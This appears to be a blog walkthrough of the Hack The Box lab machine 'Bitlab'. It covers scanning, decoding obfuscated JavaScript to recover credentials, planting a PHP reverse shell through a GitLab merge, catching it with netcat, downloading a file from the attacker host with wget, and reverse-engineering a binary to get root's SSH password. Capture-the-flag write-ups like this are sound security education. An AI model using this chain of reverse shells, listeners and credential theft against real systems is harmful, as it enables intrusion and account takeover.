---
layout: post
title: "Bitlab"
categories: HTB-Walkthrough
---

![bitlab](/assets/img/bitlab/bitlab1.png)


<h3>Nmap</h3>

```
nmap -sV -Pn 10.10.10.114 -p- |tee -a bit.txt
```

```
Nmap scan report for 10.10.10.114
Host is up (0.092s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


<hr width="300" size="10">


<h3>dirsearch</h3>

```
dirsearch -u http://10.10.10.114/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt -r -t 40
```

After finding a few interesting directories, I stop the scan because it is taking so long...and I have already gained access.

```
Target: http://10.10.10.114/

[19:13:08] Starting: 
[19:13:10] 301 -  233B  - /help  ->  http://10.10.10.114/help/
[19:13:11] 301 -  236B  - /profile  ->  http://10.10.10.114/profile/
[19:13:12] 200 -   13KB - /search  
[19:13:13] 302 -   93B  - /projects  ->  http://10.10.10.114/explore
[19:13:20] 200 -   13KB - /public     
[19:13:37] 302 -  100B  - /groups  ->  http://10.10.10.114/explore/groups
[19:13:42] 302 -   91B  - /test  ->  http://10.10.10.114/clave
[19:15:21] 200 -   16KB - /root                
[19:15:56] 200 -   13KB - /explore         
[19:16:28] 301 -   86B  - /ci  ->  http://10.10.10.114/
[19:21:36] 302 -   91B  - /Test  ->  http://10.10.10.114/clave
[19:22:05] 302 -  102B  - /snippets  ->  http://10.10.10.114/explore/snippets
[20:20:25] 400 -    0B  - /%C0                                                    
[21:07:59] 401 -   49B  - /27079%5Fclassicpeople2%2Ejpg                                        
CTRL+C detected: Pausing threads, please wait...                                                              
[e]xit / [c]ontinue / [n]ext: e                                     
 
Canceled by the user
```


<hr width="300" size="10">



<h3>Web</h3>

The url http://10.10.10.114 redirects to http://10.10.10.114/users/sign_in

![web1](/assets/img/bitlab/bitlab-web1.png)


During the initial 'click all the things', we find that '/help' unexpectedly takes us to a directory listing.

![help](/assets/img/bitlab/bitlab-help.png)

`/bookmarks.html` has further links.

![bookmarks](/assets/img/bookmarks/bitlab-bookmarks.png)

The source reveals that the 'GitLab Login' runs a Javascript function.

I used curl to view it:

![js-source](/assets/img/bitlab/bitlab-js-source.png)

```
<A HREF="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&qu\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
```


<hr width="300" size="10">



I used [malwaredecoder.com](https://malwaredecoder.com/) to decode it.
The results reveal some creds:

![decode](/assets/img/bitlab/bitlab-decode.png)

`clave / 11des0081x`



<hr width="300" size="10">


Logging in with clave's credentials, we arrive at a projects page:

![projects](/assets/img/bitlab/bitlab-projects.png)



<hr width="300" size="10">

Exploring the account, I find a possible point where I can inject some code and get a reverse shell.

Edit 'index.php' in the 'root/profile' project. Note the 'ToDo' instruction to 'Connect with Postgresql'

![indexphp](/assets/img/bitlab/bitlab-root-profile-indexphp.png)


<hr width="300" size="10">


Get a php-reverse-shell from /usr/share/ or from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Edit index.php, replacing its contents.

![edit](/assets/img/bitlab/bitlab-edit-index-evil.png)

In branches we can view 'patch-1' which we have updated, we click 'merge requests' and then 'submit merge request'.

![submit](/assets/img/bitlab/bitlab-submit-merge-request.png)


Next we have to click 'merge', to authorize the merging:

![merge](/assets/img/bitlab/bitlab-merge.png)

It takes a few moments to process.

![merging](/assets/img/bitlab/bitlab-merging.png)


After the update has been successfully merged we can trigger the exploit by clicking the user button at the top-right of the screen,
and selecting 'Settings', which links to /profile.

![trigger](/assets/img/bitlab/bitlab-trigger.png)


We catch the shell on 'nc -nlvp 6969'

![www-data-shell](/assets/img/bitlab/bitlab-www-data-shell.png)


<hr width="300" size="10">



We can use `sudo -l` to see what www-data can execute as root:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls /home
clave
$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
```

<hr width="300" size="10">



<h3>Privilege Escalation</h3>


<h4>www-data to clave</h4>

We need to complete the `TODO` and fix the postgresql.

Looking in `Snippets` we find one that relates to postgresql.

![snippets](/assets/img/bitlab/bitlab-snippets-postgres.png)


Clicking on the link, we find some php code controlling postgresql that needs to be fixed.

![postgres-before](/assets/img/bitlab/bitlab-postgres-fix-before.png)


```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
var_dump(pg_fetch_all($result));
?>
```

To execute this, we can create a file containing this code on the target and run it, or move one over from Kali.

Before I use vi I make my shell better:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

Ctrl+Z
stty raw -echo
fg
```

I copy the file across with wget then execute it.

```
www-data@bitlab:/dev/shm$ wget http://10.10.14.7/pg-connect.php
--2020-04-07 11:33:25--  http://10.10.14.7/pg-connect.php
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 199 [application/octet-stream]
Saving to: 'pg-connect.php'

pg-connect.php      100%[===================>]     199  --.-KB/s    in 0s      

2020-04-07 11:33:25 (47.2 MB/s) - 'pg-connect.php' saved [199/199]

www-data@bitlab:/dev/shm$ ls 
pg-connect.php
www-data@bitlab:/dev/shm$ php pg-connect.php
array(1) {
  [0]=>
  array(3) {
    ["id"]=>
    string(1) "1"
    ["username"]=>
    string(5) "clave"
    ["password"]=>
    string(22) "c3NoLXN0cjBuZy1wQHNz=="
  }
}

```

It returns clave's base64 encoded password.

```
root@kali:~/HTB/active/bitlab# echo c3NoLXN0cjBuZy1wQHNz== |base64 -d
ssh-str0ng-p@ssbase64: invalid input
```

Trying the plaintext password fails, but the base64 string works.

`clave / c3NoLXN0cjBuZy1wQHNz==`



```
www-data@bitlab:/dev/shm$ su clave
Password: 

clave@bitlab:/dev/shm$ cd /home/clave
clave@bitlab:~$ ls
RemoteConnection.exe  user.txt
clave@bitlab:~$ cat user.txt
1exxxxxxxxxxxxxxxxxxxxxxxxx154
```


<hr width="300" size="10">


<h4>Clave to root - RE</h4>


`sudo -l` returns that:

```
Sorry, user clave may not run sudo on bitlab.
```

```
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8  2019 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8  2019 .cache
drwx------ 3 clave clave  4096 Aug  8  2019 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30  2019 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
```

Looking at the user clave's home directory, we find a windows binary `RemoteConnection.exe`

I use `Ollydbg` to examine the file.

Setting a breakpoint at a point where the program appears to compare the unicode string 'clave',
I run the program, where it breaks the registers show an `ssh` command with root's credentials.

`root / Qf7]8YSV.wDNF*[7d?j&eD4^`

![ollydbg](/assets/img/bitlab/bitlab-ollydbg.png)





<hr width="300" size="10">





We can now try to get a root shell via ssh.



```
root@kali:~/HTB/active/bitlab# ssh root@10.10.10.114
root@10.10.10.114's password: 
Last login: Tue Apr  7 00:50:21 2020 from 10.10.14.43
root@bitlab:~# cat /root/root.txt
8d4xxxxxxxxxxxxxxxxxxxxxxxxxxxxx7c
root@bitlab:~# 
```


:)



